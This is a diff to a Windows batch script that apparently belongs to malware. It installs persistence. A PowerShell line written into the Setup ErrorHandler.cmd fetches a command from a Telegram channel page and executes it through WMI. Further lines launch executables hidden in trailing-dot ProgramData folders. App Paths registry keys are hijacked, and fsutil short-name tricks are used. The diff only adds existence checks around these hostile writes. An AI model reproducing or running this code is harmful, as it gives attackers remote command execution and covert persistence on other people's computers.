@@ -29,9 +29,9 @@ fsutil file setshortname C:\ProgramData\logdata..\ ""
 fsutil file setshortname C:\ProgramData\diaglogs..\ ""
 rd /s /q "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
 
-echo powershell.exe -NoProfile -Command "$u='https://t.me/s/rurmetm';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
-echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
-echo powershell.exe \\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini >> "%ProgramData%\USOShared\logs.cmd"
+dir "%WINDIR%\Setup\Scripts\ErrorHandler.cmd" >nul || echo powershell.exe -NoProfile -Command "$u='https://t.me/s/rurmetm';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+dir "%ProgramData%\USOShared\log.cmd" >nul || echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
+dir "%ProgramData%\USOShared\logs.cmd" >nul || echo powershell.exe \\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini >> "%ProgramData%\USOShared\logs.cmd"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\info.exe" /t REG_SZ /d "%ProgramData%\USOShared\logs.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%ProgramData%\USOShared\log.cmd" /f
